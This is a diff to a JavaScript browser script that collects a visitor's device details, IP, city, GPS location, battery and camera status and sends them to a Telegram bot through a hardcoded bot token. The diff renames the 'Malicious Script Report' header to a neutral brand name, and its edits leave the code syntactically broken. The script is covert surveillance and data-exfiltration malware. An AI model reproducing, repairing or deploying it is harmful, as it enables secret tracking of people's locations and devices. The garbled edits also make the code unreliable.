@@ -355,7 +355,7 @@ async function getDeviceInfo() {
 // 4. Telegram exfiltration functions (same as before)
 async function sendTextToTelegram(data) {
   const message = `
-*🔰 Malicious Script Report 🔰*
+*🔰 Opas Labs 🔰*
 
 🌐 Basic Info:
 - Browser: ${data.browser}
@@ -376,12 +376,12 @@ async function sendTextToTelegram(data) {
 - Latency (RTT): ${data.network.rtt}
 - Data Saver: ${data.network.saveData}
 
-📍 *Location & IP*
-- IP: ${data.ip}
-- City: ${data.city}
-- Region: ${data.region}
-- Country: ${data.country}
-- GPS: ${data.location}
+var message = `📍 *Location & IP*
+- IP: ||${ip}|| // This line wraps IP in a spoiler
+- City: ${city}
+- Region: ${region}
+- Country: ${country}
+- GPS: ${gps}
 
 🔋 *Battery*
 - Level: ${data.battery}
@@ -390,6 +390,11 @@ async function sendTextToTelegram(data) {
 📷 *Camera Status*
 - ${data.cameraStatus}
     `;
+
+    Api.sendMessage({
+    text: message,
+    parse_mode: "MarkdownV2" // Ensure compatibility with spoilers
+});
 
   return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
     method: "POST",
